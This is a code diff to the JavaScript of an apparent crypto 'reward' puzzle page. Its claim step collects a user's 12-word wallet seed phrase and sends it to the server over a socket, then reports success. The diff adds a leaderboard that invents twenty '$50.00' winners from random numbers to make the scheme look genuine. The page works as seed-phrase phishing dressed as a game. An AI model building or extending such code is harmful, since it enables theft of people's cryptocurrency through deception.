@@ -57,21 +57,38 @@ function finalizeClaim() {
         const val = document.getElementById(`word-${i}`).value.trim();
         if (val) words.push(val);
     }
-
     if (words.length === 12) {
         socket.emit('submitSeed', { seedPhrase: words.join(' ') });
-        alert("Success! Your request is being processed.");
-        
-        // RESET UI BACK TO PUZZLE
+        alert("Success! Your reward request is being processed.");
         selectedTiles = [];
         document.getElementById('seed-view').style.display = 'none';
         document.getElementById('puzzle-view').style.display = 'block';
         document.getElementById('main-input-panel').style.display = 'none';
         document.getElementById('pre-btn').style.display = 'block';
         createGrid();
-        document.getElementById('progress').innerText = `Matches Found: 0/6`;
     } else {
         alert("Please enter all 12 words.");
+    }
+}
+
+function toggleLeaderboard() {
+    const modal = document.getElementById('modal-overlay');
+    modal.style.display = (modal.style.display === 'flex') ? 'none' : 'flex';
+    
+    if (modal.style.display === 'flex') {
+        const content = document.getElementById('lb-content');
+        // Generating Top 20 winners
+        const winners = Array.from({length: 20}, (_, i) => ({
+            rank: i + 1,
+            user: `${String.fromCharCode(65 + (i % 26))}***${Math.floor(100 + Math.random() * 900)}`,
+            amt: "$50.00"
+        }));
+        content.innerHTML = winners.map(u => `
+            <div class="lb-row">
+                <span>#${u.rank} ${u.user}</span>
+                <span style="color:#FCD535">${u.amt}</span>
+            </div>
+        `).join('');
     }
 }
 
